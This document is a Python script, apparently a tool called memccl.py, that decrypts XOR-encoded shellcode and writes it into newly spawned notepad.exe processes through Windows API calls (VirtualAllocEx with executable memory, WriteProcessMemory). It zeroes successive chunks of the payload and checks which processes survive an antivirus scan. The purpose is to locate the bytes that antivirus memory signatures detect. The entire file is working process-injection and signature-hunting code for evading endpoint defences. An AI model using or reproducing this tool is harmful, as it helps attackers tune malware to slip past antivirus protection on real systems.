import os
import sys
import ctypes
import psutil
from ctypes import wintypes, Structure, sizeof, byref
from multiprocessing import Process, Queue


# Manually define STARTUPINFOW structure
class STARTUPINFOW(Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

# Manually define PROCESS_INFORMATION structure
class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

# Define constants
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04

# Define Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [
    wintypes.HANDLE,
    wintypes.LPVOID,
    wintypes.LPCVOID,
    ctypes.c_size_t,
    ctypes.POINTER(ctypes.c_size_t)
]
WriteProcessMemory.restype = wintypes.BOOL

CreateProcess = kernel32.CreateProcessW
CreateProcess.argtypes = [
    wintypes.LPCWSTR,          # lpApplicationName
    wintypes.LPWSTR,           # lpCommandLine
    ctypes.c_void_p,           # lpProcessAttributes
    ctypes.c_void_p,           # lpThreadAttributes
    wintypes.BOOL,             # bInheritHandles
    wintypes.DWORD,            # dwCreationFlags
    ctypes.c_void_p,           # lpEnvironment
    wintypes.LPCWSTR,          # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFOW),  # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION)  # lpProcessInformation
]
CreateProcess.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL


# Logging function
def log(message):
    with open("feature_finding_log.txt", "a") as f:
        f.write(message + "\n")
    print(f"{message}")


# Load shellcode and inject into the target process
def inject_shellcode(shellcode, target_process=r"C:\Windows\System32\notepad.exe"):
    """
    Inject shellcode into a newly created process.

    :param shellcode: Raw shellcode data
    :param target_process: Target process name
    :return: Injection success status and injected address
    """
    startup_info = STARTUPINFOW()
    startup_info.cb = sizeof(STARTUPINFOW)  # Set structure size
    process_info = PROCESS_INFORMATION()

    # Create the target process
    if not CreateProcess(
        target_process,
        None,
        None,
        None,
        False,
        0,
        None,
        None,
        byref(startup_info),
        byref(process_info)
    ):
        raise Exception("Failed to create target process")

    try:
        # Allocate memory
        allocated_memory = VirtualAllocEx(
            process_info.hProcess,
            None,
            len(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        if not allocated_memory:
            raise Exception("Memory allocation failed")

        # Write shellcode
        written = ctypes.c_size_t()
        if not WriteProcessMemory(
            process_info.hProcess,
            allocated_memory,
            shellcode,
            len(shellcode),
            byref(written)
        ):
            raise Exception("Failed to write to memory")

        return True, allocated_memory, process_info.dwProcessId

    finally:
        CloseHandle(process_info.hProcess)
        CloseHandle(process_info.hThread)

# Check if a process is alive
def is_process_alive(pid):
    """
    Check if a process with the specified PID is still running.

    :param pid: Process ID
    :return: Whether the process is alive
    """
    handle = kernel32.OpenProcess(0x1000, False, pid)
    if not handle:  # Handle is 0 means failure
        error_code = ctypes.get_last_error()
        # ERROR_INVALID_PARAMETER (87) indicates the process does not exist
        print(pid, error_code)
        if error_code == 87:
            return False
        # Other errors are considered as the process exists (e.g., insufficient permissions)
        return True
    else:
        # Close the handle and confirm existence
        kernel32.CloseHandle(handle)
        return True

def is_pid_running(pid):
    """
    Determine if the given PID is alive in the Windows system.

    Parameters:
        pid (int): The process ID to check.

    Returns:
        bool: Returns True if the process is alive, otherwise False.
    """
    try:
        # Get the process object for the specified PID
        process = psutil.Process(pid)
        # Check if the process is running
        return process.is_running()
    except psutil.NoSuchProcess:
        # If the process does not exist, catch the exception and return False
        return False
    except psutil.AccessDenied:
        # If permission is denied, also consider the process non-existent
        return False

# Define XOR decryption function
def xor_decrypt(data, key):
    return bytes(byte ^ key for byte in data)


# Process injection and scanning tasks for a single chunk
def process_chunk(chunk_start, chunk_end, shellcode, target_process):
    """
    Perform injection and scanning for a single chunk.

    :param chunk_start: Start position of the current chunk
    :param chunk_end: End position of the current chunk
    :param shellcode: Raw shellcode data
    :param target_process: Target process name
    """
    modified_shellcode = bytearray(shellcode)
    modified_shellcode[chunk_start:chunk_end] = b"\x00" * (chunk_end - chunk_start)

    try:
        success, injected_address, injected_pid = inject_shellcode(bytes(modified_shellcode), target_process)
        if success:
            log(f"Shellcode injection successful, injected address: {hex(injected_address)}, PID: {injected_pid}")
        else:
            log(f"Shellcode injection failed, chunk [{chunk_start}, {chunk_end})")
        return injected_pid
    except Exception as e:
        log(f"Error occurred while processing chunk [{chunk_start}, {chunk_end}): {e}")


# Main function
def main():
    if len(sys.argv) != 3:
        print("Usage: python memccl.py <encrypted_shellcode.enc> <key>")
        sys.exit(1)

    encrypted_file = sys.argv[1]
    key = int(sys.argv[2]) & 0xFF  # Ensure the key is a single-byte value

    if not os.path.exists(encrypted_file):
        print(f"Error: File {encrypted_file} does not exist")
        sys.exit(1)

    with open(encrypted_file, "rb") as f:
        encrypted_shellcode = f.read()

    # Decrypt shellcode
    shellcode = xor_decrypt(encrypted_shellcode, key)
    log(f"Shellcode decryption successful, size: {len(shellcode)} bytes")
    round_number = 1
    while True:
        log(f"=== Round {round_number} testing ===")
        start = int(input("Enter start position: "))
        end = int(input("Enter end position: "))
        chunks = int(input("Enter initial number of chunks: "))
        chunk_size = (end - start) // chunks
        chunk_info = []
        for i in range(chunks):
            current_start = start + i * chunk_size
            current_end = min(start + (i + 1) * chunk_size, end)
            chunk_info.append((process_chunk(current_start, current_end, shellcode, r"C:\Windows\System32\notepad.exe"), current_start, current_end))
        log("All chunks have been injected, please scan using antivirus software or memory scanning tools...")
        input("Press Enter to continue after scanning...")
        for i in chunk_info:
            if is_pid_running(i[0]):
                log(f"[√] Process {i[0]} is alive from {i[1]} to {i[2]}")
            else:
                log(f"[×] Process {i[0]} is dead from {i[1]} to {i[2]}")
        round_number += 1

if __name__ == "__main__":
    main()